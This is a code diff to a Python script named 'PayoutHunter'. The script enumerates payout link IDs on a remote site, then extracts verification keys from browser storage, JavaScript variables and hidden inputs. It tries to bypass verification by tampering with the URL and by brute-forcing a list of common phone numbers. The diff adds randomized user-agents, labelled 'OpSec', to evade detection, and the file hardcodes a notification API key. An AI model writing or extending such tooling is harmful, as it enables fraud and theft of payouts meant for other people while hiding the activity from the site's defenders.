@@ -18,6 +18,7 @@ import re # New import for regex
 from selenium import webdriver # New import for web automation
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
+from fake_useragent import UserAgent # NEW: Import for OpSec
 
 # ==================== CONFIGURATION ====================
 PUSHOVER_USER_KEY = os.getenv("PUSHOVER_USER", "uthdrjggurywppdc33k5y49nkeegqe")
@@ -45,6 +46,10 @@ class PayoutHunter:
         self.checks_count = 0
         self.use_proxies = bool(FREE_PROXIES)
         self.driver = None
+        
+        # NEW: Initialize UserAgent for OpSec
+        self.ua = UserAgent(fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
+
         if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
             print("⚠️  WARNING: Pushover credentials not set!")
             print("   Continuing without notifications.")
@@ -63,7 +68,7 @@ class PayoutHunter:
                 return json.load(f)
         except FileNotFoundError:
             return {
-                'total_checked	': 0,
+                'total_checked': 0,
                 'total_found': 0,
                 'last_found': None,
                 'hunt_sessions': 0
@@ -91,6 +96,17 @@ class PayoutHunter:
         with open(STATS_FILE, 'w') as f:
             json.dump(self.stats, f, indent=2)
 
+    def get_random_headers(self):
+        """Generates random headers for OpSec"""
+        return {
+            'User-Agent': self.ua.random,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+        }
+
     async def check_id(self, id_str, session=None):
         url = BASE_URL + id_str
         if url in self.found_links:
@@ -99,7 +115,9 @@ class PayoutHunter:
             session = self.session
         for retry in range(MAX_RETRIES + 1):
             try:
-                async with session.get(url, allow_redirects=False, ssl=False) as response:
+                # NEW: Use randomized headers
+                headers = self.get_random_headers()
+                async with session.get(url, allow_redirects=False, ssl=False, headers=headers) as response:
                     if response.status in [301, 302, 303, 307, 308]:
                         location = response.headers.get("Location", "")
                         if ERROR_URL in location or '/error' in location:
@@ -121,6 +139,9 @@ class PayoutHunter:
         options.add_argument('--headless')
         options.add_argument('--no-sandbox')
         options.add_argument('--disable-dev-shm-usage')
+        # NEW: Set randomized User-Agent for Selenium
+        options.add_argument(f'user-agent={self.ua.random}')
+        
         try:
             service = Service(ChromeDriverManager().install())
             self.driver = webdriver.Chrome(service=service, options=options)
@@ -143,12 +164,11 @@ class PayoutHunter:
             if match:
                 return match.group(0).strip()
 
-            # 2. Search for the key in JavaScript variables and client-side storage (most aggressive pen-testing)
+            # 2. Search for the key in JavaScript variables and client-side storage
             
             # Function to search storage (Local and Session)
             def search_storage(storage_type):
                 try:
-                    # Execute JS to dump all keys and values from the storage type
                     storage_data = self.driver.execute_script(f"""
                         let data = {{}};
                         for (let i = 0; i < {storage_type}.length; i++) {{
@@ -174,7 +194,7 @@ class PayoutHunter:
             if storage_key:
                 return storage_key
 
-            # 3. Search Global JavaScript Variables (original logic)
+            # 3. Search Global JavaScript Variables
             js_script = """
             function findPhoneNumber(obj) {
                 const pattern = /\(\d{3}\)\s*\d{3}-\d{4}|\d{10}/;
@@ -191,7 +211,7 @@ class PayoutHunter:
             if js_key:
                 return js_key.strip()
 
-            # 4. Search hidden inputs (original logic)
+            # 4. Search hidden inputs
             hidden_inputs = self.driver.find_elements(by=webdriver.common.by.By.XPATH, value="//input[@type='hidden']")
             for element in hidden_inputs:
                 value = element.get_attribute('value')
@@ -206,36 +226,27 @@ class PayoutHunter:
     def attempt_invasive_bypass(self, url):
         """
         Attempts active, invasive pen-testing methods to bypass verification.
-        This function is designed to be run only if passive key extraction fails.
         """
         self.initialize_driver()
         if not self.driver:
             return None
 
         # 1. Direct Access Tampering
-        # Check if simply appending a common success parameter works
         try:
             tampered_url = url + "&verified=true"
             self.driver.get(tampered_url)
-            # Check for a known success element (e.g., a final payout form)
-            # This is a placeholder, you will need to customize this check
             if "payout/final" in self.driver.current_url or "success" in self.driver.page_source.lower():
                 return f"DIRECT ACCESS SUCCESS: {tampered_url}"
         except:
             pass
 
-        # 2. Brute Force/Dictionary Attack (Requires knowing the form element)
-        # This is a placeholder as we don't know the form field name.
-        # This part requires the user to provide the form element ID/Name and the submission URL.
-        # For now, we will attempt a simple form submission with common keys.
-        
-        # Common "speakeasy" keys that might be used
+        # 2. Brute Force/Dictionary Attack
         COMMON_KEYS = [
-            '5551234567', # Common test number
-            '1234567890', # Simple sequence
-            '1111111111', # Simple repeat
+            '5551234567',
+            '1234567890',
+            '1111111111',
             '0000000000',
-            url.split("=")[-1] # The raw link ID
+            url.split("=")[-1]
         ]
 
         try:
@@ -249,17 +260,14 @@ class PayoutHunter:
                 input_field.clear()
                 input_field.send_keys(key_attempt)
                 submit_button.click()
-                time.sleep(1) # Wait for redirect/response
+                time.sleep(1)
                 
-                # Check for success (e.g., a redirect or a new element appearing)
                 if "payout/final" in self.driver.current_url or "success" in self.driver.page_source.lower():
                     return f"BRUTE FORCE SUCCESS: Key '{key_attempt}'"
                 
-                # Go back to the verification page to try the next key
                 self.driver.back()
 
         except Exception as e:
-            # print(f"   ⚠️  Invasive bypass attempt failed: {e}")
             pass
             
         return None
@@ -275,6 +283,8 @@ class PayoutHunter:
             title = '💰 New Payout Found!'
         def notify():
             try:
+                # NEW: Use randomized headers for Pushover request as well
+                headers = self.get_random_headers()
                 requests.post(
                     "https://api.pushover.net/1/messages.json",
                     data={
@@ -287,6 +297,7 @@ class PayoutHunter:
                         "priority": 1,
                         "sound": "cashregister"
                     },
+                    headers=headers, # Use randomized headers
                     timeout=5
                 )
                 print(f"   📱 Notification sent!")
@@ -308,7 +319,7 @@ class PayoutHunter:
                     self.found_links.add(url)
                     self.save_found_link(url)
                     key = self.analyze_and_extract_key(url)
-                    # If passive extraction fails, attempt invasive bypass (pen-test mode)
+                    
                     if not key:
                         invasive_result = self.attempt_invasive_bypass(url)
                         if invasive_result:
@@ -318,7 +329,7 @@ class PayoutHunter:
                             key_status = "Key: NOT FOUND (Manual Check Required)"
                     else:
                         key_status = f"Key: {key} (PASSIVE EXTRACTION SUCCESS)"
-
+                    
                     self.send_notification(url, key)
                     self.stats['last_found'] = datetime.now().isoformat()
                     found_count += 1
@@ -330,7 +341,8 @@ class PayoutHunter:
         print("🔫  Starting Payout Hunter...")
         print(f"   - Concurrent checks: {CONCURRENT_CONNECTIONS}")
         print(f"   - Batch size: {BATCH_SIZE}")
-        print(f"   - Pen-Test Mode: ACTIVE (Using Selenium for key extraction)")
+        print(f"   - OpSec Mode: ACTIVE (Randomized User-Agents)")
+        print(f"   - Pen-Test Mode: ACTIVE (Invasive Key Extraction)")
         print("   - Press Ctrl+C to stop")
         print("\n" + "="*40)
         self.stats['hunt_sessions'] += 1
